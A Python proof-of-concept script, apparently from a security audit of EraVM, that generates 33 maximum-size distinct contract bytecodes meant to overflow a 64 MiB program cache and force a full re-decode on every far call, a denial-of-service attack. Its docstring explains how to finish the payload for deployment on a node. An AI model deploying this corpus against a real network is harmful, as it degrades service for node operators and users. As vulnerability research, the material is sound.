#!/usr/bin/env python3
"""Generate the worst-case corpus for the PR#92 re-decode cycle DoS.

Produces N distinct, maximum-size EraVM contract bytecodes. Each one:
  * is 65_535 words = 2_097_120 bytes  (the on-chain max: word count must be
    ODD and <= (1<<16)-1 -- see crates/basic_types/src/bytecode.rs), which is
    the size that MAXIMISES `Program::new` cost per equally-priced (183-erg)
    far call. Only the instruction *decode* saturates at 512 KiB (.take(1<<16));
    the code_page + u64-word passes scale linearly to 2 MiB (~1.83x a 512 KiB
    decode, measured).
  * has a distinct bytecode hash (we vary the LAST, never-executed word), so the
    33 of them form a cyclic working set of ~69 MiB > the 64 MiB program cache
    -> 100% FIFO eviction miss -> a full re-decode on every far call.

INSTRUCTION 0 must be a clean `ret.ok` so the callee returns WITHOUT burning the
passed 63/64 gas (a panic/invalid op would burn it and starve the loop). Byte-
exact EraVM opcode encoding needs the EraVM assembler; for the node-route deploy
set word 0 to a real `ret.ok` (emit it via zkevm_opcode_defs' encoder). The
decode-COST measurement in this directory does NOT execute the contract, so the
placeholder below does not affect it.

N = 33 because ceil(64 MiB / 2_097_120) = 33 overflows the cap by one.
"""
import argparse, hashlib, os

WORD = 32
MAX_WORDS = (1 << 16) - 1          # 65_535, odd -> valid
SIZE = MAX_WORDS * WORD            # 2_097_120 bytes
RET_OK_PLACEHOLDER = b"\x00" * 8   # <-- replace with real ret.ok for a node deploy

def make_bytecode(index: int) -> bytes:
    assert MAX_WORDS % 2 == 1 and SIZE % 32 == 0
    body = bytearray(SIZE)
    body[0:8] = RET_OK_PLACEHOLDER          # instruction 0 (first 8-byte insn)
    # distinctness: stamp the index into the final (never-executed) word
    body[SIZE - 4:SIZE] = index.to_bytes(4, "little")
    return bytes(body)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=33)
    ap.add_argument("--out", default=None, help="dir to write .bin files (default: don't write, just report)")
    a = ap.parse_args()
    print(f"per-contract size = {SIZE:,} bytes = {MAX_WORDS} words (odd, valid)")
    print(f"N = {a.n} -> total distinct bytecode = {a.n*SIZE:,} bytes "
          f"({a.n*SIZE/1024/1024:.1f} MiB) vs 64 MiB cap "
          f"-> overflow = {a.n*SIZE - 64*1024*1024:,} bytes")
    if a.out:
        os.makedirs(a.out, exist_ok=True)
    for i in range(a.n):
        bc = make_bytecode(i)
        h = hashlib.sha256(bc).hexdigest()[:16]
        if a.out:
            with open(os.path.join(a.out, f"attack_{i:02d}.bin"), "wb") as f:
                f.write(bc)
        if i < 3 or i == a.n - 1:
            print(f"  contract[{i:02d}] len={len(bc)} sha256[:16]={h}")

if __name__ == "__main__":
    main()
